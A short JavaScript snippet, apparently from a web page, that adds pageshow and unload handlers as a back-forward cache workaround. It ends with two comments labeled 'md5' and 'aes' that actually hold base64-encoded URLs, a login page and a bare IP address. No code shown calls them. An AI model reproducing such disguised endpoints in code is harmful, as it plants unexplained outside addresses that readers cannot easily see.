if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cHM6Ly93d3cueXhxaW0ueHl6L2luZGV4L3VzZXIvbG9naW4uaHRtbA==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/